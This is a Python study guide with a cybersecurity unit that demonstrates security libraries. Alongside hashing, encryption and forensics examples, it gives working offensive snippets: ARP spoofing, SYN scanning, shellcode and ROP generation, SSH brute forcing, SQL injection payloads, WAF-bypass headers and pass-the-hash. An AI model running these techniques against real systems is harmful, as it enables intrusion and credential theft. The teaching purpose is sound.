1. What is the difference between `@classmethod` and `@staticmethod`?
2. Implement a `BankAccount` class with deposit, withdraw, and overdraft protection.
3. What does MRO stand for? Explain the C3 linearization.
4. When would you use `__slots__`?
5. Implement the `__iter__` and `__next__` methods for a `FibSequence` class.

## Unit 4 — Functional

1. Explain the closure bug: `funcs = [lambda: i for i in range(3)]`. What does `funcs[0]()` return?
2. Write a decorator that retries a function up to 3 times on exception.
3. What is the difference between a generator and a list comprehension in memory usage?
4. Implement `map` and `filter` using generator expressions.
5. What does `yield from` do?

## Unit 5-12 — Mixed

1. Write a context manager that temporarily changes directory.
2. What exceptions does `dict["missing_key"]` raise vs `dict.get("missing_key")`?
3. Write a custom `JSONEncoder` for `datetime` objects.
4. Explain the GIL and when to use threads vs processes.
5. What is the difference between `@lru_cache` and `@cache`?
6. Write a metaclass that logs all method calls.
7. Explain `__enter__` and `__exit__` parameters in detail.
8. How does `asyncio.gather` differ from `asyncio.wait`?
9. Write a type-annotated generic `Stack[T]` class.
10. What is `__init_subclass__` used for?

---

> 📌 **Quick Reference — Complexity Cheat Sheet**:
>
> | Structure | Lookup | Insert | Delete | Notes |
> |-----------|--------|--------|--------|-------|
> | list | O(n) | O(1) end / O(n) | O(n) | Indexed |
> | dict | O(1)* | O(1)* | O(1)* | Hash table |
> | set | O(1)* | O(1)* | O(1)* | Hash table |
> | deque | O(n) | O(1) both ends | O(1) ends | Doubly-linked |
> | heapq | O(log n) push/pop | O(log n) | — | Min-heap |
> | sortedlist (sortedcontainers) | O(log n) | O(log n) | O(log n) | Maintains order |
>
> *average case


---

# Unit 13: Python for Cybersecurity 🔐

> Python is the dominant language in cybersecurity — from CTF competitions to penetration testing, malware analysis, and network forensics. This unit covers the key libraries every security-focused Python developer should know.

## Cybersecurity Libraries Overview

| Library | Install | Category | Key Use |
|---------|---------|----------|---------|
| `hashlib` | built-in | Cryptography | MD5, SHA-1, SHA-256, SHA-512 hashing |
| `cryptography` | `pip install cryptography` | Cryptography | Fernet, RSA, AES symmetric/asymmetric |
| `ssl` + `socket` | built-in | Networking | TLS connections, raw TCP/UDP sockets |
| `scapy` | `pip install scapy` | Network | Packet crafting, sniffing, ARP spoofing |
| `pwntools` | `pip install pwntools` | Exploitation | CTF, ROP chains, shellcode, format strings |
| `paramiko` | `pip install paramiko` | Remote Access | SSH client/server automation |
| `requests` / `httpx` | `pip install requests httpx` | Web | HTTP fuzzing, web scraping, API testing |
| `impacket` | `pip install impacket` | Windows | SMB, LDAP, Kerberos, Windows protocols |
| `python-nmap` | `pip install python-nmap` | Recon | Port scanning wrapper around nmap |
| `pyOpenSSL` | `pip install pyOpenSSL` | Cryptography | OpenSSL bindings, certificate inspection |
| `bandit` | `pip install bandit` | Static Analysis | Finds security bugs in Python source code |
| `volatility3` | `pip install volatility3` | Forensics | Memory dump analysis |

---

## 13.1 hashlib — Hashing & Digests

> **What is hashing?** A hash function takes any input and produces a fixed-size output (digest). Same input → always same output. But you **cannot reverse** a hash to get the original input. Used for password storage, file integrity, digital signatures.

> **Install**: Built-in (no install needed)
> **Syntax**: `hashlib.sha256(data).hexdigest()` — data must be `bytes`

```python
import hashlib   # built-in — always available

# ── Basic hashing ──────────────────────────────────────────────
text = "hello world"   # the string we want to hash

# SHA-256 (most common — use for passwords, file hashes)
h = hashlib.sha256(text.encode())   # .encode() converts str to bytes — hashlib requires bytes
print(h.hexdigest())   # "b94d27b9..." — 64 hex chars = 256 bits

# SHA-512 (stronger, larger digest)
hashlib.sha512(text.encode()).hexdigest()   # 128 hex chars = 512 bits

# MD5 (fast but BROKEN for security — only use for checksums, never passwords!)
hashlib.md5(text.encode()).hexdigest()      # 32 hex chars = 128 bits

# SHA-1 (also broken for security — legacy use only)
hashlib.sha1(text.encode()).hexdigest()     # 40 hex chars = 160 bits

# ── Getting raw bytes instead of hex string ────────────────────
h.digest()       # raw bytes (32 bytes for SHA-256)
h.hexdigest()    # hex string (64 chars for SHA-256)
h.digest_size    # 32 — number of bytes in the digest

# ── Listing all available hash algorithms ──────────────────────
hashlib.algorithms_available    # set of all supported algorithms on this platform
hashlib.algorithms_guaranteed   # set guaranteed on ALL platforms

# ── Hashing large files efficiently (streaming) ────────────────
def hash_file(filepath):
    """Hash a file without loading it all into memory"""
    h = hashlib.sha256()            # create hash object
    with open(filepath, "rb") as f: # open in BINARY mode
        while chunk := f.read(8192):      # read 8KB chunks
            h.update(chunk)               # update hash with each chunk
    return h.hexdigest()            # final hash after all chunks processed

# ── HMAC — keyed hash for message authentication ───────────────
import hmac

secret_key = b"my_secret_key"     # shared secret (keep this safe!)
message = b"important data"       # message to authenticate

mac = hmac.new(secret_key, message, hashlib.sha256).hexdigest()
# Anyone with the secret key can verify the message was not tampered with

# Verify (constant-time comparison — prevents timing attacks!)
def verify_hmac(key, message, received_mac):
    expected = hmac.new(key, message, hashlib.sha256).hexdigest()
    return hmac.compare_digest(expected, received_mac)  # safe comparison

# ── Password hashing (use hashlib.scrypt for passwords!) ────────
# Never use plain SHA-256 for passwords — too fast, vulnerable to brute force
password = b"user_password"
salt = hashlib.sha256(b"random_salt").digest()   # in real code, use os.urandom(16)

# scrypt = memory-hard hash, slow by design (resists brute force)
dk = hashlib.scrypt(password, salt=salt, n=2**14, r=8, p=1)
print(dk.hex())  # derived key — store this in the database, not the password
```

> 🔐 **Security Rules**:
> - **Never** store plain text passwords — always hash them
> - For passwords: use `hashlib.scrypt`, `bcrypt`, or `argon2` — NOT plain SHA-256
> - For file integrity: SHA-256 or SHA-512 is fine
> - Use `hmac.compare_digest()` for comparing hashes — prevents timing attacks

---

## 13.2 cryptography — Symmetric & Asymmetric Encryption

> **What is encryption?** Encryption scrambles data so only authorized parties can read it. **Symmetric** = same key to encrypt and decrypt. **Asymmetric** = public key encrypts, private key decrypts.

> **Install**: `pip install cryptography`

```python
# ══════════════════════════════════════════════════════════════
# SYMMETRIC ENCRYPTION — Fernet (AES-128-CBC + HMAC-SHA256)
# Best for: encrypting data you need to read back (files, database fields)
# ══════════════════════════════════════════════════════════════
from cryptography.fernet import Fernet

# ── Generate a key (do this ONCE, then save the key securely) ──
key = Fernet.generate_key()     # 32-byte URL-safe base64-encoded key
print(key)                      # b'...' — SAVE THIS KEY! Without it, data is unrecoverable

f = Fernet(key)                 # create cipher object with the key

# ── Encrypt ───────────────────────────────────────────────────
plaintext = b"secret message"   # must be bytes
ciphertext = f.encrypt(plaintext)
print(ciphertext)               # b'gAAAAAAA...' — encrypted (different every time due to IV)

# ── Decrypt ───────────────────────────────────────────────────
recovered = f.decrypt(ciphertext)
print(recovered)                # b'secret message' — original data recovered

# ── Time-limited tokens (expire after N seconds) ──────────────
token = f.encrypt(b"time-sensitive data")
f.decrypt(token, ttl=60)        # raises InvalidToken if older than 60 seconds

# ══════════════════════════════════════════════════════════════
# AES — Direct AES-GCM (authenticated encryption)
# ══════════════════════════════════════════════════════════════
import os
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

key = AESGCM.generate_key(bit_length=256)   # 256-bit AES key
aes = AESGCM(key)

nonce = os.urandom(12)           # 12-byte random nonce — NEVER reuse with same key!
ciphertext = aes.encrypt(nonce, b"my secret", b"associated data")
plaintext = aes.decrypt(nonce, ciphertext, b"associated data")

# ══════════════════════════════════════════════════════════════
# ASYMMETRIC ENCRYPTION — RSA
# Best for: key exchange, digital signatures, TLS handshakes
# ══════════════════════════════════════════════════════════════
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes, serialization

# ── Generate RSA key pair ──────────────────────────────────────
private_key = rsa.generate_private_key(
    public_exponent=65537,   # standard value — always use 65537
    key_size=2048,           # minimum 2048 bits for security
)
public_key = private_key.public_key()   # extract public key from private key

# ── Encrypt with public key (only private key can decrypt) ────
ciphertext = public_key.encrypt(
    b"secret data",
    padding.OAEP(                   # OAEP padding — secure padding scheme
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None
    )
)

# ── Decrypt with private key ───────────────────────────────────
plaintext = private_key.decrypt(ciphertext, padding.OAEP(
    mgf=padding.MGF1(algorithm=hashes.SHA256()),
    algorithm=hashes.SHA256(),
    label=None
))

# ── Sign a message (prove authenticity) ───────────────────────
signature = private_key.sign(
    b"message to sign",
    padding.PSS(mgf=padding.MGF1(hashes.SHA256()), salt_length=padding.PSS.MAX_LENGTH),
    hashes.SHA256()
)

# ── Verify signature (anyone with public key can verify) ──────
public_key.verify(
    signature,
    b"message to sign",
    padding.PSS(mgf=padding.MGF1(hashes.SHA256()), salt_length=padding.PSS.MAX_LENGTH),
    hashes.SHA256()
)  # raises InvalidSignature if tampered

# ── Serialize keys (save to file / send over network) ─────────
pem_private = private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.BestAvailableEncryption(b"passphrase")
)

pem_public = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)
```

---

## 13.3 ssl + socket — TLS & Raw Sockets

> **What are sockets?** A socket is an endpoint for network communication. Python's `socket` module gives you raw TCP/UDP networking. `ssl` wraps sockets with TLS encryption.

> **Install**: Built-in

```python
import socket   # low-level networking
import ssl      # TLS/SSL encryption layer

# ── Raw TCP client ─────────────────────────────────────────────
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   # IPv4 TCP socket
s.connect(("example.com", 80))      # connect (hostname, port)
s.send(b"GET / HTTP/1.0\r\nHost: example.com\r\n\r\n")  # send raw HTTP request
response = s.recv(4096)             # receive up to 4096 bytes
print(response.decode())            # decode bytes to string
s.close()                           # ALWAYS close when done

# ── TLS client — HTTPS connection ──────────────────────────────
context = ssl.create_default_context()  # secure context — verifies server cert

with socket.create_connection(("example.com", 443)) as raw_sock:
    with context.wrap_socket(raw_sock, server_hostname="example.com") as tls_sock:
        tls_sock.send(b"GET / HTTP/1.0\r\nHost: example.com\r\n\r\n")
        print(tls_sock.recv(4096).decode())
        print(tls_sock.version())         # "TLSv1.3"
        print(tls_sock.cipher())          # current cipher suite
        print(tls_sock.getpeercert())     # server's certificate info

# ── TCP server ─────────────────────────────────────────────────
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # reuse port quickly
server.bind(("0.0.0.0", 9999))     # bind to all interfaces
server.listen(5)                   # queue up to 5 connections
conn, addr = server.accept()       # BLOCKS until client connects
print(f"Connected from {addr}")
data = conn.recv(1024)
conn.send(b"Hello from server!")
conn.close()
server.close()

# ── UDP socket ─────────────────────────────────────────────────
udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
udp.sendto(b"ping", ("8.8.8.8", 53))
data, addr = udp.recvfrom(512)
```

---

## 13.4 scapy — Packet Crafting & Sniffing

> **What is scapy?** Scapy lets you create, send, receive, and dissect network packets at any layer. Essential for network testing and exploitation.

> **Install**: `pip install scapy` · **Run as root/sudo** for raw socket access

```python
from scapy.all import *   # import all scapy modules

# ── Build packets — layers stacked with / ─────────────────────
pkt = Ether() / IP(dst="192.168.1.1") / TCP(dport=80, flags="S")
# Ether() = Ethernet (layer 2), IP() = IP header (layer 3), TCP() = TCP (layer 4)
pkt.show()    # print all fields

# ── ICMP ping ─────────────────────────────────────────────────
ping_pkt = IP(dst="8.8.8.8") / ICMP()
response = sr1(ping_pkt, timeout=2)   # send and receive 1 reply
if response:
    print(f"Reply from {response[IP].src}: ttl={response[IP].ttl}")

# ── TCP SYN scan ──────────────────────────────────────────────
def syn_scan(target, ports):
    for port in ports:
        pkt = IP(dst=target) / TCP(dport=port, flags="S")   # SYN packet
        resp = sr1(pkt, timeout=1, verbose=0)
        if resp and resp[TCP].flags == "SA":   # SA = SYN-ACK = open
            print(f"Port {port}: OPEN")

syn_scan("192.168.1.1", [22, 80, 443, 8080])

# ── Packet sniffing ────────────────────────────────────────────
def packet_handler(pkt):
    if pkt.haslayer(TCP):
        print(f"TCP {pkt[IP].src}:{pkt[TCP].sport} -> {pkt[IP].dst}:{pkt[TCP].dport}")
    if pkt.haslayer(DNS) and pkt[DNS].qr == 0:  # DNS query
        print(f"DNS query: {pkt[DNS].qd.qname.decode()}")

sniff(iface="eth0", prn=packet_handler, count=20)
sniff(filter="tcp port 80", prn=packet_handler, count=10)  # BPF filter

# ── ARP spoofing (authorized testing only!) ────────────────────
def arp_spoof(target_ip, gateway_ip, target_mac, gateway_mac):
    pkt1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)   # op=2 = reply
    pkt2 = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
    send(pkt1, verbose=0)
    send(pkt2, verbose=0)

# ── PCAP files ─────────────────────────────────────────────────
packets = rdpcap("capture.pcap")   # load pcap (e.g., from Wireshark)
wrpcap("output.pcap", packets)     # save packets to file
```

---

## 13.5 pwntools — CTF & Exploit Development

> **What is pwntools?** The standard CTF toolkit. Simplifies binary exploitation: process interaction, ROP chains, shellcode generation, format string attacks.

> **Install**: `pip install pwntools`

```python
from pwn import *   # imports everything from pwntools

# ── Connect to process or remote service ──────────────────────
p = process("./vulnerable_binary")    # run local binary
p = remote("ctf.example.com", 1337)   # connect to remote challenge

# ── Send and receive ───────────────────────────────────────────
p.sendline(b"hello")                 # send bytes + newline
p.sendlineafter(b"name:", b"Alice")  # wait for prompt then send
line = p.recvline()                  # receive until newline
p.recvuntil(b">>")                   # receive until specific bytes
p.interactive()                      # drop to interactive shell

# ── Integer packing ────────────────────────────────────────────
context.arch = "amd64"           # set architecture
p64(0xdeadbeef)    # pack as little-endian 64-bit bytes
p32(0xdeadbeef)    # pack as little-endian 32-bit bytes
u64(b"\x41"*8)     # unpack 8 bytes -> integer
u32(b"\x41"*4)     # unpack 4 bytes -> integer

# ── Shellcode ─────────────────────────────────────────────────
context.os = "linux"
context.arch = "amd64"
shellcode = asm(shellcraft.sh())    # /bin/sh shellcode for current arch
print(enhex(shellcode))             # hex representation

# ── ROP chains ────────────────────────────────────────────────
elf = ELF("./vulnerable_binary")    # load binary
rop = ROP(elf)
rop.call(elf.sym["puts"], [elf.got["puts"]])  # puts(puts@GOT) to leak libc
rop.call(elf.sym["main"])
chain = rop.chain()    # bytes to inject as payload

# ── ELF analysis ──────────────────────────────────────────────
elf.symbols         # all symbols dict
elf.got             # GOT addresses dict
elf.plt             # PLT addresses dict
elf.sym["main"]     # address of main function
list(elf.search(b"/bin/sh"))  # find string in binary
```

---

## 13.6 paramiko — SSH Automation

> **What is paramiko?** Pure-Python SSHv2 implementation. Automate SSH connections, run remote commands, transfer files via SFTP.

> **Install**: `pip install paramiko`

```python
import paramiko

# ── Connect with password ──────────────────────────────────────
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # auto-accept host keys (testing)
client.connect("192.168.1.100", port=22, username="admin", password="password123")

# ── Connect with SSH key (more secure) ────────────────────────
client.connect("192.168.1.100", username="root", key_filename="~/.ssh/id_rsa")

# ── Run remote command ─────────────────────────────────────────
stdin, stdout, stderr = client.exec_command("whoami && id")
print(stdout.read().decode())    # print command output
print(stderr.read().decode())    # print errors if any
client.close()

# ── SFTP file transfer ─────────────────────────────────────────
sftp = client.open_sftp()
sftp.put("/local/file.txt", "/remote/file.txt")  # upload local -> remote
sftp.get("/remote/file.txt", "/local/copy.txt")  # download remote -> local
sftp.listdir("/remote/path")     # list remote directory
sftp.stat("/remote/file.txt")    # get file metadata (size, mtime)
sftp.close()
client.close()

# ── SSH brute force (authorized testing only!) ────────────────
def ssh_login(host, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, username=username, password=password, timeout=3)
        client.close()
        return True   # authentication succeeded
    except paramiko.AuthenticationException:
        return False  # wrong credentials
    except Exception:
        return False  # connection refused / timeout
```

---

## 13.7 requests & httpx — HTTP Security Testing

> **What are these?** `requests` is the most popular Python HTTP library. Used for API testing, web fuzzing, automated scanning.

> **Install**: `pip install requests httpx`

```python
import requests

# ── Basic requests ────────────────────────────────────────────
r = requests.get("https://httpbin.org/get")
r.status_code       # 200 = OK, 403 = Forbidden, 404 = Not Found
r.text              # response body as string
r.json()            # parse JSON response -> dict
r.headers           # response headers dict

r = requests.post("https://api.example.com/login",
    json={"username": "admin", "password": "test123"},
    headers={"Authorization": "Bearer token123"}
)

# ── Custom headers (bypass WAF / spoof user agent) ────────────
headers = {
    "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1)",   # spoof Googlebot
    "X-Forwarded-For": "127.0.0.1",    # attempt to spoof IP (server-side bypass)
}
r = requests.get("https://target.com/admin", headers=headers)

# ── Session — persist cookies across requests ──────────────────
s = requests.Session()
s.post("https://target.com/login", data={"user": "admin", "pass": "admin"})
r = s.get("https://target.com/dashboard")  # session cookie auto-sent

# ── Directory brute force ─────────────────────────────────────
wordlist = ["admin", "login", "dashboard", ".git", "robots.txt", "backup"]
for path in wordlist:
    r = requests.get(f"https://target.com/{path}", allow_redirects=False)
    if r.status_code not in [404, 403]:
        print(f"[{r.status_code}] /{path}")   # found something!

# ── SQL injection detection ───────────────────────────────────
payloads = ["'", "' OR '1'='1", "' OR 1=1--"]
for p in payloads:
    r = requests.get(f"https://target.com/user?id={p}")
    if "error" in r.text.lower() or "sql" in r.text.lower():
        print(f"Possible SQLi: {p}")   # SQL error leaked!

# ── Proxy through Burp Suite ──────────────────────────────────
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.get("https://target.com", proxies=proxies, verify=False)
# verify=False disables TLS cert check (needed for Burp proxy)
```

---

## 13.8 impacket — Windows Protocol Exploitation

> **What is impacket?** Python classes for Windows network protocols: SMB, LDAP, Kerberos, DCERPC. Foundation of tools like CrackMapExec.

> **Install**: `pip install impacket`

```python
from impacket.smbconnection import SMBConnection

# ── SMB connect and enumerate ─────────────────────────────────
conn = SMBConnection("192.168.1.10", "192.168.1.10")
conn.login("admin", "Password123", domain="CORP")   # NTLM authentication

for share in conn.listShares():
    print(share["shi1_netname"])   # print share names (C$, ADMIN$, IPC$, etc.)

# ── Pass The Hash (PTH) — use NTLM hash instead of password ───
conn.login("administrator", "", domain="CORP", lmhash="", nthash="aad3b435...")
# No password needed — just the NTLM hash from the SAM/NTDS database

# ── LDAP enumeration ──────────────────────────────────────────
from impacket.ldap import ldap as impacket_ldap

conn = impacket_ldap.LDAPConnection("ldap://192.168.1.10", "dc=corp,dc=local")
conn.login("user@corp.local", "Password123")
conn.search(
    searchBase="dc=corp,dc=local",
    searchFilter="(objectClass=user)",          # find all user objects
    attributes=["sAMAccountName", "memberOf", "adminCount"]  # fields to retrieve
)
```

---

## 13.9 python-nmap — Port Scanning

> **What is python-nmap?** Python wrapper for the nmap port scanner. Programmatically run scans and parse results.

> **Install**: `pip install python-nmap` + `brew install nmap` (or `apt install nmap`)

```python
import nmap

nm = nmap.PortScanner()   # create scanner object

# ── Scan ports ────────────────────────────────────────────────
nm.scan("192.168.1.1", "22-1024")           # single host, port range
nm.scan("192.168.1.0/24", "22")             # entire subnet
nm.scan("192.168.1.1", "1-1024", "-sV")     # with service version detection

# ── Parse results ─────────────────────────────────────────────
for host in nm.all_hosts():
    print(f"Host: {host} — {nm[host].state()}")   # up / down
    for proto in nm[host].all_protocols():
        for port in nm[host][proto].keys():
            state = nm[host][proto][port]["state"]  # "open", "closed", "filtered"
            service = nm[host][proto][port].get("name", "?")  # service name
            print(f"  {proto}/{port}: {state} ({service})")

# ── Service & version info ─────────────────────────────────────
nm["192.168.1.1"]["tcp"][80]["product"]   # "Apache httpd"
nm["192.168.1.1"]["tcp"][80]["version"]   # "2.4.41"

# ── NSE scripts ───────────────────────────────────────────────
nm.scan("192.168.1.1", "445", "--script=smb-vuln-ms17-010")  # EternalBlue check
nm.scan("192.168.1.1", "443", "--script=ssl-enum-ciphers")   # SSL cipher check
```

---

## 13.10 pyOpenSSL — Certificate Inspection

> **What is pyOpenSSL?** Python bindings for OpenSSL. Inspect TLS certificates, check expiry, validate chains, detect weak algorithms.

> **Install**: `pip install pyOpenSSL`

```python
import socket
from OpenSSL import SSL, crypto
from datetime import datetime

def get_cert(hostname, port=443):
    """Get TLS certificate from a server"""
    context = SSL.Context(SSL.TLSv1_2_METHOD)
    conn = SSL.Connection(context, socket.create_connection((hostname, port)))
    conn.set_tlsext_host_name(hostname.encode())  # SNI — required for shared hosting
    conn.do_handshake()            # complete TLS handshake
    cert = conn.get_peer_certificate()   # get server certificate
    conn.close()
    return cert

cert = get_cert("example.com")

# ── Certificate info ──────────────────────────────────────────
subject = cert.get_subject()
print(f"CN: {subject.CN}")          # common name (domain)
print(f"Org: {subject.O}")          # organization name
print(f"Country: {subject.C}")      # country code
print(f"Issuer: {cert.get_issuer().CN}")  # certificate authority

# ── Check expiry ──────────────────────────────────────────────
not_after = cert.get_notAfter().decode()
expiry = datetime.strptime(not_after, "%Y%m%d%H%M%SZ")
days_left = (expiry - datetime.utcnow()).days
print(f"Expires in {days_left} days")
if days_left < 30:
    print("Certificate expires soon!")   # alert for renewal

# ── Weak algorithm detection ──────────────────────────────────
algo = cert.get_signature_algorithm().decode()
if "sha1" in algo.lower() or "md5" in algo.lower():
    print(f"Weak signature algorithm: {algo}")  # SHA-1/MD5 are broken for TLS
```

---

## 13.11 bandit — Static Security Analysis

> **What is bandit?** Scans Python source code for common security issues: hardcoded passwords, dangerous functions, SQL injection, insecure hashing.

> **Install**: `pip install bandit`

```bash
# ── CLI usage ─────────────────────────────────────────────────
bandit -r ./myproject/              # scan directory recursively
bandit -r . -f json -o report.json  # JSON output for CI/CD integration
bandit -r . -lll                    # show only HIGH severity issues
bandit -r . -t B301,B608            # run specific tests only
bandit -r . --skip B101             # skip specific test (B101=assert_used)
```

```python
# ── Patterns that bandit flags ────────────────────────────────
exec(user_input)                        # B102 HIGH — Remote Code Execution!
password = "admin123"                   # B105 MED  — hardcoded password in code
app.run(debug=True)                     # B201 HIGH — Flask debug mode exposes REPL
pickle.loads(untrusted_data)            # B301 HIGH — arbitrary code execution!
hashlib.md5(password)                   # B303 MED  — MD5 broken, use SHA-256+
requests.get(url, verify=False)         # B501 HIGH — TLS cert not verified (MITM!)
subprocess.call(cmd, shell=True)        # B602 HIGH — shell injection possible!
os.system(user_cmd)                     # B605 HIGH — OS command injection!
# Fix SQLi properly:
query = "SELECT * FROM users WHERE name = %s"
cursor.execute(query, (name,))          # B608 SAFE — parameterized query
```

---

## 13.12 volatility3 — Memory Forensics

> **What is Volatility?** Industry-standard memory forensics framework. Analyzes RAM dumps to extract processes, network connections, registry keys, and injected shellcode.

> **Install**: `pip install volatility3`

```bash
# ── Common volatility3 commands ───────────────────────────────
vol -f memdump.raw windows.info              # OS version + architecture
vol -f memdump.raw windows.pslist            # list running processes
vol -f memdump.raw windows.pstree            # process tree (parent-child)
vol -f memdump.raw windows.psscan            # scan for EPROCESS structs (finds hidden)
vol -f memdump.raw windows.netstat           # active network connections
vol -f memdump.raw windows.dlllist --pid 4   # DLLs loaded by process
vol -f memdump.raw windows.cmdline           # command-line args of all processes
vol -f memdump.raw windows.malfind           # find injected shellcode/PE in memory
vol -f memdump.raw windows.hashdump          # extract NTLM password hashes
vol -f memdump.raw windows.registry.hivelist # list registry hives
vol -f memdump.raw windows.dumpfiles --pid 1234   # dump files from process
```

```python
# ── Python API ────────────────────────────────────────────────
import volatility3.framework as framework
from volatility3.framework import contexts
from volatility3.plugins.windows import pslist

ctx = contexts.Context()
ctx.config["automagic.LayerStacker.single_location"] = "file:///path/to/memdump.raw"

plugin = pslist.PsList(ctx, "plugins.PsList")
for row in plugin.run():
    pid  = row[0]    # process ID
    ppid = row[1]    # parent process ID
    name = row[2]    # process name
    print(f"PID: {pid}  PPID: {ppid}  Name: {name}")
```

> 🔐 **Common malware indicators in memory**:
> - Processes with no parent PID (orphaned/injected)
> - `svchost.exe` or `explorer.exe` with unexpected PPID
> - Memory regions flagged by `malfind` (RWX permissions)
> - Active connections from unexpected processes
> - Process appears in `psscan` but **not** in `pslist` (hidden rootkit process)

---

> 📺 **Cybersecurity Python Resources**:
>
> | Topic | Resource |
> |-------|----------|
> | Scapy Tutorial | [Art of Packet Crafting](https://0xbharath.github.io/art-of-packet-crafting-with-scapy/) |
> | pwntools Docs | [docs.pwntools.com](https://docs.pwntools.com/) |
> | cryptography Library | [cryptography.io](https://cryptography.io/) |
> | Volatility Docs | [volatility3.readthedocs.io](https://volatility3.readthedocs.io/) |
> | impacket Examples | [github.com/fortra/impacket](https://github.com/fortra/impacket/tree/master/examples) |
> | Python for Hackers | [pentesterlab.com](https://pentesterlab.com/) |
> | Hack The Box | [hackthebox.com](https://www.hackthebox.com) |
> | TryHackMe Python Path | [tryhackme.com](https://tryhackme.com) |
